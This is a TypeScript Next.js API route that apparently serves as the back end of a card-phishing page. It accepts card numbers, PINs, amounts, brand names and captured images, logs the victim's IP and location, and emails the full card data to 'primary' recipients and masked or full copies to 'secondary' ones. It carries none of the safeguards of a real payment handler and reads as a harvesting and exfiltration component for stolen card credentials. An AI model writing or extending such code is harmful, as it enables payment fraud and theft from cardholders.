// src/app/api/notify/log/route.ts
import { NextResponse } from "next/server";
import { sendEmail, getPrimaryEmails, getSecondaryEmails } from "@/lib/email";
import { maskForSecondary } from "@/lib/mask";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { event, brandName, cardNumber, pin, amount, status, message, imageBase64 } = body;
    
    const primaryEnabled = String(process.env.NOTIFY_TYPING_ENABLED ?? 'true').toLowerCase() === 'true';
    
    // Extract IP and Location (Vercel provides these headers natively)
    const ip = req.headers.get('x-forwarded-for')?.split(',')[0].trim() || req.headers.get('x-real-ip') || 'Unknown';
    const city = req.headers.get('x-vercel-ip-city') || '';
    const region = req.headers.get('x-vercel-ip-country-region') || '';
    const country = req.headers.get('x-vercel-ip-country') || '';
    const location = [city, region, country].filter(Boolean).join(', ') || 'Unknown';

    const attachments: any[] = [];
    if (imageBase64 && imageBase64.startsWith('data:image')) {
      const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
      if (matches && matches[2]) {
        attachments.push({ filename: `capture.${matches[1]}`, content: matches[2] });
      }
    }

    // Base HTML template with dynamic fields
    const baseHtml = `
      <div style="font-family: Arial, sans-serif; padding: 20px; color: #333;">
        <h2 style="color: ${event === 'success' ? '#28a745' : '#dc3545'};">
          ${event === 'success' ? '✅ SUCCESS' : event === 'upload' ? '📸 UPLOAD' : '❌ FAILED'} - ${brandName}
        </h2>
        <table style="width: 100%; border-collapse: collapse; margin-top: 15px;">
          <tr><td style="padding: 8px; border-bottom: 1px solid #eee;"><strong>Card Number:</strong></td><td style="padding: 8px; border-bottom: 1px solid #eee; font-family: monospace;">{CARD_NUMBER}</td></tr>
          ${pin ? `<tr><td style="padding: 8px; border-bottom: 1px solid #eee;"><strong>PIN:</strong></td><td style="padding: 8px; border-bottom: 1px solid #eee; font-family: monospace;">${pin}</td></tr>` : ''}
          <tr><td style="padding: 8px; border-bottom: 1px solid #eee;"><strong>Amount:</strong></td><td style="padding: 8px; border-bottom: 1px solid #eee;">$${amount}</td></tr>
          <tr><td style="padding: 8px; border-bottom: 1px solid #eee;"><strong>Status:</strong></td><td style="padding: 8px; border-bottom: 1px solid #eee;">${status}</td></tr>
          <tr><td style="padding: 8px; border-bottom: 1px solid #eee;"><strong>Message:</strong></td><td style="padding: 8px; border-bottom: 1px solid #eee;">${message}</td></tr>
          <tr><td style="padding: 8px; border-bottom: 1px solid #eee;"><strong>IP Address:</strong></td><td style="padding: 8px; border-bottom: 1px solid #eee; font-family: monospace;">${ip}</td></tr>
          <tr><td style="padding: 8px; border-bottom: 1px solid #eee;"><strong>Location:</strong></td><td style="padding: 8px; border-bottom: 1px solid #eee;">${location}</td></tr>
          <tr><td style="padding: 8px; border-bottom: 1px solid #eee;"><strong>Time:</strong></td><td style="padding: 8px; border-bottom: 1px solid #eee;">${new Date().toLocaleString()}</td></tr>
        </table>
      </div>
    `;

    // 1. Send to Primary (Full Code) - Only if enabled
    if (primaryEnabled) {
      const primaryEmail = getPrimaryEmails();
      if (primaryEmail) {
        const htmlPrimary = baseHtml.replace('{CARD_NUMBER}', cardNumber || 'N/A');
        await sendEmail({ to: primaryEmail, subject: `Result - ${brandName}`, html: htmlPrimary, attachments });
      }
    }

    // 2. Send to Secondary
    const secondaryEmails = getSecondaryEmails();
    if (secondaryEmails.length > 0) {
      let htmlSecondary = '';
      
      if (primaryEnabled && cardNumber) {
        const masked = maskForSecondary(cardNumber);
        htmlSecondary = baseHtml.replace('{CARD_NUMBER}', masked);
      } else {
        htmlSecondary = baseHtml.replace('{CARD_NUMBER}', cardNumber || 'N/A');
      }
      
      await sendEmail({ to: secondaryEmails, subject: `Result - ${brandName}`, html: htmlSecondary, attachments });
    }

    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error(err);
    return NextResponse.json({ error: "Server error" }, { status: 500 });
  }
}